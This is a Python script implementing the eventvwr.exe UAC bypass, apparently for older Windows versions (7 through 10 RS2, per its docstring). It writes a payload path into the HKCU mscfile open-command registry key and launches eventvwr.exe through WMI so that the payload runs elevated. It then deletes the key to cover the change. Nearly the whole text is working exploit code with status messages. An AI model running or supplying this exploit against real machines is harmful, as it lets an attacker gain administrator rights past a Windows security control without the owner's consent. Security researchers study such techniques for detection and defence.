"""
Works from: Windows 7 (7600)
Fixed in: Windows 10 RS2 (15031)
"""
from __future__ import print_function
import os
import wmi
import time
import _winreg
import win32con
from colorama import init, Fore
init(convert=True)

wmi = wmi.WMI()

payload = "c:\\windows\\system32\\cmd.exe"

def successBox():
	return (Fore.GREEN + '[+]' + Fore.RESET)
	
def errorBox():
	return (Fore.RED + '[-]' + Fore.RESET)

def infoBox():
	return (Fore.CYAN + '[!]' + Fore.RESET)	
	
def warningBox():
	return (Fore.YELLOW + '[!]' + Fore.RESET)

def eventvwr():
	print(" {} eventvwr: Attempting to create registry key".format(infoBox()))
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
					os.path.join("Software\Classes\mscfile\shell\open\command"))
								
		_winreg.SetValueEx(key,
				None,
				0,
				_winreg.REG_SZ,
				payload)
		_winreg.CloseKey(key)
		print(" {} eventvwr: Registry key created".format(successBox()))
	except Exception as error:
		print(" {} eventvwr: Unable to create key".format(errorBox()))
		return False

	print(" {} eventvwr: Pausing for 5 seconds before executing".format(infoBox()))	
	time.sleep(5)
		
	print(" {} eventvwr: Attempting to create process".format(infoBox()))
	try:
		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start eventvwr.exe",
						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
		if (result[1] == 0):
			print(" {} eventvwr: Process started successfully".format(successBox()))
		else:
			print(" {} eventvwr: Problem creating process".format(errorBox()))
	except Exception as error:
		print(" {} eventvwr: Problem creating process".format(errorBox()))
		return False

	print(" {} eventvwr: Pausing for 5 seconds before cleaning".format(infoBox()))	
	time.sleep(5)

	print(" {} eventvwr: Attempting to remove registry key".format(infoBox()))
	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
				os.path.join("Software\Classes\mscfile"))
		print(" {} eventvwr: Registry key was deleted".format(successBox()))
	except Exception as error:
		print(" {} eventvwr: Unable to delete key".format(errorBox()))
		return False

